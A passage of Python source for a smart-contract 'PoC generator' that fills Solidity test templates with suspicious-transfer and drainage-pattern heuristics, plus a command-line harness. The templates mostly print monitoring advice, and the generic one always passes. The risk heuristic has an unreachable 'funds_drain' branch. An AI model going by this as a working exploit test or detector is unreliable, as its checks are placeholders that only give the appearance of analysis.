            console.log("Transfer value exceeds $10,000");
        } else {
            console.log("LOW: Normal sized transfer");
        }
    }

    function _checkForRapidTransfers() private {
        console.log("\\n=== Rapid Transfer Pattern Analysis ===");
        
        // In a real implementation, this would analyze multiple blocks
        console.log("Checking for rapid succession transfers...");
        console.log("Indicators of suspicious rapid transfers:");
        console.log("1. Multiple large transfers in same block");
        console.log("2. Transfers to multiple addresses quickly");
        console.log("3. Round-trip transfers (wash trading)");
        console.log("4. Transfers followed by immediate swaps");
        
        // Simulate checking current block for multiple transfers
        console.log("Current block:", block.number);
        console.log("Timestamp:", block.timestamp);
        
        console.log("ANALYSIS: Monitor for follow-up transfers in next few blocks");
    }

    function _checkForSuspiciousPatterns() private {
        console.log("\\n=== Suspicious Pattern Detection ===");
        
        // Check for common attack patterns
        console.log("Checking for known attack patterns:");
        
        // Pattern 1: Dust attacks
        console.log("1. Dust Attack: Small amounts to many addresses");
        
        // Pattern 2: Sybil patterns  
        console.log("2. Sybil Pattern: Coordinated transfers between related addresses");
        
        // Pattern 3: Mixing patterns
        console.log("3. Mixing Pattern: Complex transfer chains to obscure origin");
        
        // Pattern 4: Time-based patterns
        console.log("4. Time Pattern: Transfers at suspicious times (e.g., right before exploit)");
        
        // Pattern 5: Amount patterns
        console.log("5. Amount Pattern: Round numbers or mathematically related amounts");
        
        if ({{ risk_score }} > 0.8) {
            console.log("HIGH RISK: Multiple suspicious patterns detected!");
            console.log("Recommended actions:");
            console.log("- Flag addresses for monitoring");
            console.log("- Alert relevant parties");
            console.log("- Consider blacklisting if confirmed malicious");
        }
    }

    function _checkForDrainagePatterns() private {
        console.log("\\n=== Drainage Pattern Analysis ===");
        
        console.log("Analyzing for token/ETH drainage patterns:");
        
        // Check if this looks like a drainage operation
        if (_isTokenContract()) {
            uint256 totalSupply = IERC20(TARGET_CONTRACT).totalSupply();
            uint256 estimatedTransferAmount = {{ estimated_impact }} * 10**18 / 2000; // Rough conversion to tokens
            
            if (totalSupply > 0 && estimatedTransferAmount > 0) {
                uint256 percentOfSupply = (estimatedTransferAmount * 100) / totalSupply;
                
                console.log("Transfer represents ~% of total supply:", percentOfSupply);
                
                if (percentOfSupply > 20) {
                    console.log("CRITICAL: Transfer represents >20% of total supply!");
                    console.log("This could be a major drainage event!");
                } else if (percentOfSupply > 5) {
                    console.log("WARNING: Transfer represents >5% of total supply");
                    console.log("Significant liquidity movement detected");
                }
            }
        }
        
        // Check for drainage timing patterns
        console.log("\\nDrainage timing analysis:");
        console.log("- Transfers late at night (low monitoring)");
        console.log("- Transfers during major news events (distraction)");
        console.log("- Transfers right after exploit discovery");
        console.log("- Transfers before major announcements");
        
        console.log("\\nPost-transfer monitoring recommendations:");
        console.log("1. Monitor receiver addresses for further movements");
        console.log("2. Check for immediate swaps to other assets");
        console.log("3. Track potential mixer/tumbler usage");
        console.log("4. Alert relevant exchanges about suspicious addresses");
    }
}
'''
        return Template(template_str)

    def _get_generic_template(self) -> Template:
        """Generic template for unknown or general vulnerability types"""
        template_str = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract {{ poc_id|replace("_","")|title }}Test is Test {
    function test_GenericVulnerability() public {
        console.log("=== Generic Vulnerability PoC ===");
        console.log("Contract: {{ contract_address }}");
        console.log("Vulnerability: {{ vulnerability_type }}");
        console.log("Risk Score: {{ risk_score }}");
        console.log("Transaction: {{ transaction_hash }}");
        
        // Generic test - always passes but logs important info
        assertTrue(true, "PoC template generated successfully");
    }
}
'''
        return Template(template_str)


# ------------------- CLI harness for quick tests ------------------- #
def _load_json(path: Path) -> Dict:
    try:
        return json.loads(path.read_text())
    except Exception as e:
        logger.error("Failed to read JSON %s: %s", path, e)
        return {}


def _make_dummy_risk(event) -> Dict:
    # Minimal synthetic risk object if the user doesn't provide one
    # Basic heuristics: large value -> funds_drain, swap -> liquidity_drain
    
    # Handle both Pydantic model objects and dictionaries
    if hasattr(event, 'metadata'):
        # Pydantic model - access attributes directly
        meta = event.metadata
        event_type = event.event_type
    else:
        # Dictionary - use .get()
        meta = event.get("metadata")
        event_type = event.get("event_type", "")
    
    try:
        if isinstance(meta, str):
            meta = json.loads(meta)
    except Exception:
        meta = {}
    args = meta.get("args", {}) if isinstance(meta, dict) else {}
    value = args.get("value") or args.get("amount0") or args.get("amount")
    val_eth = 0.0
    try:
        val_eth = float(int(value) / 10**18) if value else 0.0
    except Exception:
        val_eth = 0.0

    if event_type.lower() == "swap" or val_eth >= 10:
        vuln = "liquidity_drain"
    elif val_eth >= 100:
        vuln = "funds_drain"
    else:
        vuln = "approval_exploit"
    return {
        "vulnerability_type": vuln,
        "risk_score": min(1.0, val_eth / 1000.0 + 0.1),
        "potential_impact": val_eth * 2000,  # rough $ estimate for demo
        "attack_vector": "auto_generated"
    }


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("event_json", nargs="?", help="path to event json", default=None)
    p.add_argument("risk_json", nargs="?", help="optional risk assessment json", default=None)
    p.add_argument("--out", help="optional out dir", default=None)
    args = p.parse_args()

    gen = PoCGenerator(out_dir=Path(args.out) if args.out else None)

    # load event
    if args.event_json:
        event = _load_json(Path(args.event_json))
    else:
        # example event if none provided
        event = {
            "transaction_hash": "0xdeadbeef",
            "block_number": 17000000,
            "contract_address": "0x0000000000000000000000000000000000000000",
            "event_type": "Transfer",
            "metadata": json.dumps({"args": {"value": "200000000000000000000"}})
        }

    # load or synthesize risk assessment
    if args.risk_json:
        risk = _load_json(Path(args.risk_json))
    else:
        risk = _make_dummy_risk(event)

    # generate PoC (sync wrapper)
    resp = gen.generate_poc_sync(event, risk)
    if resp.status == "generated":
        print(f"PoC generated: {resp.poc_id} -> {resp.out_path}")
    else:
        print(f"PoC generation failed: {resp.description}")
